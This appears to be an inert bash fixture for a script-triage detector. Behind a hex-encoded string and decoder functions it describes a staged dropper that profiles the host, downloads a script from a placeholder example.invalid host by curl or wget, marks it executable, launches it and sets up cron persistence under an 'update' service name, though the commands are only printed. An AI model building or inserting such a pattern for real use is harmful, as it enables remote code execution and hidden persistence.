# configuration reconstruction
#!/usr/bin/env bash
# Huntress Script Triage -- inert static-analysis fixture (bash_linux)
readonly Material_a606954f='76:3d:31:7c:73:74:65:70:73:3d:70:72:6f:66:69:6c:65:5f:68:6f:73:74:2c:61:63:71:75:69:72:65:5f:72:65:6d:6f:74:65:2c:77:72:69:74:65:5f:66:69:6c:65:2c:63:68:61:6e:67:65:5f:6d:6f:64:65:2c:64:69:73:70:61:74:63:68:5f:70:72:6f:63:65:73:73:7c:61:64:61:70:74:65:72:3d:63:75:72:6c:5f:61:72:63:68:5f:66:61:6c:6c:62:61:63:6b:7c:73:74:61:67:65:5f:63:6f:75:6e:74:3d:35:7c:63:61:6d:70:61:69:67:6e:5f:69:64:3d:63:61:6d:70:61:69:67:6e:2d:36:33:63:35:65:66:65:32:30:62:7c:75:72:6c:3d:68:74:74:70:73:3a:2f:2f:36:33:63:35:65:66:65:32:30:62:2e:65:78:61:6d:70:6c:65:2e:69:6e:76:61:6c:69:64:2f:61:62:30:35:33:30:62:65:2e:73:68:7c:75:73:65:72:5f:61:67:65:6e:74:3d:48:75:6e:74:72:65:73:73:4c:61:62:2f:36:33:63:35:65:66:65:32:30:62:7c:66:69:6c:65:5f:70:61:74:68:3d:2f:74:6d:70:2f:68:75:6e:74:72:65:73:73:2d:63:61:63:68:65:2f:2e:73:74:61:67:65:2d:36:33:63:35:65:66:65:32:30:62:7c:61:72:63:68:5f:70:72:6f:62:65:3d:75:6e:61:6d:65:2d:6d:7c:73:65:72:76:69:63:65:5f:6e:61:6d:65:3d:75:70:64:61:74:65:2d:36:33:63:35:65:66:65:32:30:62:2e:73:65:72:76:69:63:65:7c:63:72:6f:6e:5f:70:61:74:68:3d:2f:65:74:63:2f:63:72:6f:6e:2e:64:2f:75:70:64:61:74:65:2d:36:33:63:35:65:66:65:32:30:62'
readonly Codec_a606954f='hex_colon|identity|'

Load_a606954f() {
  e=()
  local IFS=':' p
  local -a pieces
  read -r -a pieces <<< "${Material_a606954f}"
  for p in "${pieces[@]}"; do e+=("$((16#$p))"); done
}

Decode_a606954f() {
  d=()
  local i
  for ((i=0; i<${#e[@]}; i++)); do
    d+=("${e[i]}")
  done
}

Recover_a606954f() {
  local -a e d
  local t n z i
  local -a compass=(north south); n="$(IFS=:; printf '%s' "${compass[*]}")"
  Load_a606954f
  case 1 in 1) Decode_a606954f ;; *) return 70 ;; esac
  t=''
  local octal character
  for i in "${!d[@]}"; do
    printf -v octal '%03o' "${d[i]}"
    printf -v character '%b' "\\$octal"
    t+="$character"
  done
  printf '%s\n' "$t"
}

Inspect_a606954f() { Recover_a606954f; }

Plan_a606954f() {
  local descriptor field key value campaign_id='' url='' user_agent='' file_path='' arch_probe='' service_name='' cron_path=''
  descriptor="$(Inspect_a606954f)"
  local -a fields
  IFS='|' read -r -a fields <<< "$descriptor"
  for field in "${fields[@]}"; do key=${field%%=*}; value=${field#*=}; case "$key" in campaign_id|url|user_agent|file_path|arch_probe|service_name|cron_path) printf -v "$key" '%s' "$value" ;; esac; done
  local -a profile_command=(uname -m) request_primary=(curl --fail --silent --show-error -o "$file_path" "$url") request_fallback=(wget -qO "$file_path" "$url") permission_command=(chmod 0700 "$file_path") launch_command=("$file_path") cron_descriptor=(printf '%s' "$cron_path" "$service_name")
  declare -p profile_command request_primary request_fallback permission_command launch_command cron_descriptor
}

if [[ ${HUNTRESS_INSPECT_ONLY:-0} == 1 ]]; then Inspect_a606954f; fi

# reconstruction complete